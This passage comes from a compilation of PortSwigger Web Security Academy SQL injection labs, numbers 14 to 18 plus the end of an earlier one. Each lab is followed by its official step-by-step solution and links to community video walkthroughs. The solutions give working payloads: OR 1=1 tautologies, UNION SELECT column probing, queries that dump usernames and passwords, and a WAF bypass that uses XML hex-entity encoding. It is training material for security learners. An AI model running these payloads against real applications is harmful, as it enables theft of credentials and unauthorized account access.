This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+OR+1=1--`
3. Submit the request, and verify that the response now contains one or more unreleased products.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=alTceRdSxS0

##### Rana Khalil

https://www.youtube.com/watch?v=X1X1UdaC_90

##### z3nsh3ll

https://www.youtube.com/watch?v=jTHz9Rz7oAo

##### Michael Sommer

https://www.youtube.com/watch?v=U1tfxVGLPAs

</details>


## 14. SQL injection with filter bypass via XML encoding

[Open the lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

<details><summary>Hint</summary>

A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension to do this.

</details>

<details><summary>Official solution</summary>

**Identify the vulnerability**

1. Observe that the stock check feature sends the `productId` and `storeId` to the application in XML format.
2. Send the `POST /product/stock` request to Burp Repeater.
3. In Burp Repeater, probe the `storeId` to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:

   `<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a `UNION SELECT` statement to the original store ID:

   `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.

**Bypass the WAF**

1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension. Just highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec\_entities/hex\_entities**.
2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

**Craft an exploit**

1. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns `0 units`, implying an error.
2. As you can only return one column, you need to concatenate the returned usernames and passwords, for example:

   `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
3. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a `~` character.
4. Use the administrator's credentials to log in and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=ELdyZm0nK4g

##### nu11 secur1ty

https://www.youtube.com/watch?v=HUY3ocPB4H4

##### Intigriti

https://www.youtube.com/watch?v=2iqMm0gMyHk

</details>


## 15. SQL injection UNION attack, determining the number of columns returned by the query

[Open the lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:

   `'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=umXGHbEyW5I

##### z3nsh3ll

https://www.youtube.com/watch?v=GP6CK03nDvw

</details>


## 16. SQL injection UNION attack, finding a column containing text

[Open the lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:

   `'+UNION+SELECT+NULL,NULL,NULL--`
3. Try replacing each null with the random value provided by the lab, for example:

   `'+UNION+SELECT+'abcdef',NULL,NULL--`
4. If an error occurs, move on to the next null and try that instead.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=SGBTC5D7DTs

##### z3nsh3ll

https://www.youtube.com/watch?v=itECw0Yn8tQ

</details>


## 17. SQL injection UNION attack, retrieving data from other tables

[Open the lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

   `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the contents of the `users` table:

   `'+UNION+SELECT+username,+password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=PLa_oQtMl1U

##### Rana Khalil

https://www.youtube.com/watch?v=6Dsj5SqR944

##### z3nsh3ll

https://www.youtube.com/watch?v=ushDHoJbwEc

</details>


## 18. SQL injection UNION attack, retrieving multiple values in a single column

[Open the lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

<details><summary>Hint</summary>

You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).

</details>

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:

   `'+UNION+SELECT+NULL,'abc'--`
3. Use the following payload to retrieve the contents of the `users` table:

   `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=yRVYoqR9vrI

##### z3nsh3ll

https://www.youtube.com/watch?v=lu_8CT0JwZs

##### Michael Sommer

https://www.youtube.com/watch?v=b5spqjjsxnw

</details>

